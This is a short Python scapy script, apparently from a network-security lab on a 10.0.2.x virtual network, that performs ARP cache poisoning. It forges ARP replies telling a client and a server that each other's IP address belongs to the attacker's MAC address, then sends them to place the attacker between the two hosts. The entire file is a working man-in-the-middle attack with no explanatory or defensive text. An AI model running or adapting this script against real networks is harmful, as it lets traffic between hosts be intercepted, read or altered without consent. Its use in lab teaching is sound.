#!/usr/bin/python3
from scapy.all import *


# Define host IP and MAC addresses

client_ip = "10.0.2.10"
client_mac = "08:00:27:76:d6:32"

server_ip = "10.0.2.12"
server_mac = "08:00:27:eb:6e:8a"

attacker_ip = "10.0.2.14"
attacker_mac = "08:00:27:7b:ba:d7"


# Create Ethernet layer with source and destination MAC addresses
eth_client = Ether(src=attacker_mac, dst=client_mac)
eth_server = Ether(src=attacker_mac, dst=server_mac)

# Create ARP layer with source and destination IP addresses
arp_request_dst_client = ARP(hwsrc=attacker_mac,psrc=server_ip,
                             hwdst=client_mac, pdst=client_ip)

arp_request_dst_server = ARP(hwsrc=attacker_mac,psrc=client_ip,
                             hwdst=server_mac, pdst=server_ip)

# Create the packets
pkt_client = eth_client/arp_request_dst_client
pkt_server = eth_server/arp_request_dst_server

pkt_client.show()
pkt_server.show()

# Send the packets
sendp([pkt_client,pkt_server])
